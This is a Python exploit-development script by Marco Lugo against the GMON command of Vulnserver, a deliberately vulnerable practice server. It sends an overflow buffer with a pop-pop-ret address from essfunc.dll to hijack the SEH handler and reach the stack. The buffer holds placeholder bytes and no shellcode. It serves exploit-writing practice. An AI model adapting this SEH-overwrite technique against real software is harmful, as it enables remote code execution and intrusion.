#########################################################################################
# Title: Vulnserver GMON command SEH exploit
# Author: Marco Lugo
# Description: find reliable way to jump to the stack.
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x625010B4) #essfunc.dll
#pop_pop_ret = struct.pack('<I', 0xCCCCCCCC)

target_ip = sys.argv[1]
buffer = 'GMON /.:/'
pattern = '\x41'*1999 + '\x42'*1500 + pop_pop_ret + '\x43'*1697
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


